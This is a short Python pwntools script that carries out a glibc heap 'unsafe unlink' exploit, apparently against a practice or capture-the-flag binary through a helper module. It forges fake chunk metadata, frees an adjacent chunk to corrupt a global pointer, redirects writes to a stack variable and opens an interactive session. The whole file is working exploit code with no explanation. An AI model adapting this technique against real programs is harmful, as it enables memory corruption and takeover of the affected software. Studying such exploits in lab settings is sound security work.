from pwn import *
from handle import *

def exploit():
	malloc(0x80)
	malloc(0x80)
	A = chunk_info(0)
	write_pointer_to_global_ptr(p64(A[0]))

	chunk_ptr = global_ptr_address()
	payload = p64(0) * 2 + p64(chunk_ptr - 3*SIZE_SZ) + p64(chunk_ptr - 2*SIZE_SZ) 
	payload = payload.ljust(0x90 - 2*SIZE_SZ, '\x00')
	payload += p64(0x90 -  2*SIZE_SZ) + p64(0x90)
	write_to_chunk(0, payload)

	free_chunk(1)
	target = stack_var_1_address()
	write_data_to_global_ptr(p64(0x0) *3 + p64(target))

p = exec_file()
exploit()
p.interactive()
p.close()
